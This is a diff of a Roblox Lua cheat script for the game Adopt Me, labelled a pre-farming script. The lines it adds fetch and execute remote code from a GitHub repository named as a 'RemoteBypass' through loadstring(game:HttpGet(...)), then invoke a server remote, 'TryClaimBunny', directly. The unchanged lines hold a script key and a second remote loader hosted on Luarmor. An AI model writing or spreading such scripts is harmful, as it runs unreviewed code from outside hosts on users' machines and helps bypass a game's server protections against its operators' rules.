@@ -1,6 +1,8 @@
---==================================================
--- PRE-FARMING SCRIPT (Runs First)
---==================================================
+wait(5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
+wait(0.1)
+game:GetService("ReplicatedStorage"):WaitForChild("adoptme_new_net"):WaitForChild("TryClaimBunny"):InvokeServer()
+wait(0.1)
 script_key = "VuEAzrzDNFjpnnPXCwaBNyjeRkwCfdnm"
 
 --getgenv().BUY_BEFORE_FARMING = {
@@ -56,8 +58,3 @@ getgenv().SETTINGS = {
     TRASH_COLLECTOR_NAMES = {"input_Username_Here_for_TRASH"},
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b7359a8866fd351cc305781fb0b0ecfc.lua"))()
-
-print("✅ Farming script loaded and running!")
-
-
-print("✅ Pet Wear Auto Buyer started in background!")
